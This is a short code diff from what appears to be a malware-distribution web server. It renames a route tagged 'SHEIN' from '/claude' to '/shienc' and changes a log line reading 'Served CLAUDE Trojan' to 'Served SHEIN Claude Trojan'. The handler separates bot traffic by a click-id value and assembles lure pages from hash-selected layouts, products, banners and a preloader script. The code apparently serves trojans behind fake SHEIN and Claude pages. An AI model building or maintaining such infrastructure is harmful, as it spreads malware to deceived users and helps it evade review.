@@ -2925,7 +2925,7 @@ function generateColor(hash) {
 }
 
 // SHEIN
-app.get('/claude', extractSubdomain, (req, res, next) => {
+app.get('/shienc', extractSubdomain, (req, res, next) => {
     const slug = req.subdomain;
     const hash = generateHash(slug);
     const preloader = "preloader.js";
@@ -2933,7 +2933,7 @@ app.get('/claude', extractSubdomain, (req, res, next) => {
     if (ttclid !== 'BOT') {
         ttclid = ttclid.slice(0, 5);
     }
-    console.log(`Served CLAUDE Trojan (${slug})::(${ttclid})`);
+    console.log(`Served SHEIN Claude Trojan (${slug})::(${ttclid})`);
     const layout = selectFromArray(layouts, parseInt(hash.substr(0, 8), 16));
     const product = selectFromArray(products, parseInt(hash.substr(8, 8), 16));
     const banner = selectFromArray(banners, parseInt(hash.substr(16, 8), 16));
